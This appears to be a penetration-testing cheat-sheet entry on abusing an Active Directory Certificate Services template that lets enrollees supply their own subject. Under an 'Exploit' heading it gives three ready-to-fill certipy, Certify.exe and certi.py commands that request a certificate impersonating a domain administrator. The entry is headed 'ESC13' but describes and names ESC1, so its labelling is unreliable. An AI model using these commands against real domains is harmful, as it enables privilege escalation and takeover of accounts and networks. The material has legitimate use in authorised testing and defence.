# ESC13

Domain Users enroll in a certificate template, which can be used for client authentication and has “ENROLLEE_SUPPLIES_SUBJECT” set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA).

## Requirements

Allows for AD authentication
has the ENROLLEE_SUPPLIES_SUBJECT flag
[PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage)

## Exploit

Exploit ESC1 by providing a custom SAN

certipy req -u [USER@DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -target [ADCS_HOST] -ca [ca_name] -template [templateName] -upn [domain admin]

Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin

certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN
